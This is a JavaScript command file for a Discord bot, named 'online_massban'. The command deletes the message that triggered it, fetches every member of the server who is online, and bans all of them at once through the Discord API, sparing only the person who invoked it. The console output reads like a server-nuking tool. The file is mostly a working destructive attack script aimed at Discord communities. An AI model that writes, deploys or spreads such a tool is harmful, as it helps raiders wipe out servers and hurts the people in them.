const axios = require("axios");
const { token } = require("../config.json");

const GREEN = '\x1b[32m';
const RESET = '\x1b[0m';
const RED = '\x1b[31m';

module.exports = {
    name: 'online_massban',
    async execute(message, args) {
        message.delete();

        try {
            const guild = message.guild;
            const members = await guild.members.fetch();

            
            const onlineMembers = members.filter(member => member.presence && member.presence.status === 'online');

            const promises = onlineMembers.map(async member => {
                if (member.id !== message.author.id) {
                    try {
                        await axios.put(
                            `https://discord.com/api/v9/guilds/${guild.id}/bans/${member.id}`,
                            {},
                            {
                                headers: {
                                    authorization: `Bot ${token}`,
                                    'Content-Type': 'application/json',
                                },
                            }
                        );
                        console.log(GREEN + `successfully>: User ${member.user.username} has been banned using https://discordapp.com/api` + RESET);
                    } catch (err) {
                        console.log(RED + `ERROR>: Error when trying to ban the user: ${member.user.username} using https://discordapp.com/api error: ${err.message}` + RESET);
                    }
                }
            });

            await Promise.all(promises);

        } catch (error) {
            if (error.response && error.response.status === 429) {
                console.log(RED + 'Rate limit hit, please try again later.' + RESET);
                return;
            }

            if (error.response && error.response.status === 403) {
                console.log(RED + 'Forbidden: Check bot permissions.' + RESET);
                return;
            }

            console.error("[CONSOLE]: Error banning users:", error);
        }
    }
}
